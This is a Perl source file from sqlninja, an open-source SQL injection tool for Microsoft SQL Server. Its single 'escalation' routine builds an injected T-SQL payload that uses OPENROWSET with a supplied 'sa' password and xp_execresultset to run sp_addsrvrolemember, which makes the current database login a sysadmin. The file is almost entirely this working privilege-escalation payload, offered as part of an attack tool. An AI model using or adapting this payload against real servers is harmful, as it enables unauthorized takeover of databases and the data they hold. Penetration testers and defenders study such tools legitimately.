# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Add current user to the sysadmin server role.
# The code assumes that sp_addsrvrolemember hasn't been disabled (and I see
# no reason why a sysadmin should disable it). If it disabled, however, the
# solution is just to use OPENROWSET for every command.
# N.B.: Only new ODBC connections will have administrative rights !
sub escalation
{
	my $cmd;
        print "[+] Trying to add current user to sysadmin group\n";
	$cmd = "declare \@u nvarchar(99), \@q nvarchar(999) ".
	       "set \@q = N'select 1 from OPENROWSET(''SQLOLEDB'',".
	       "''Network=DBMSSOCN;Address=;uid=sa;pwd=".$conf->{'password'}."'',".
	       "''select 1;".
	       "exec master.dbo.sp_addsrvrolemember '''''+".
	       "system_user+N''''',''''sysadmin'''' '')' ".
	       "exec master.dbo.xp_execresultset \@q,N'master' ";
        sendrequest($cmd);
        print "[+] Done! New connections will be run with administrative ".
		"privileges! In case\n    the server uses ODBC, you might have".
		" to wait a little bit\n    (check sqlninja-howto.html)\n";
	exit(0);
}

1;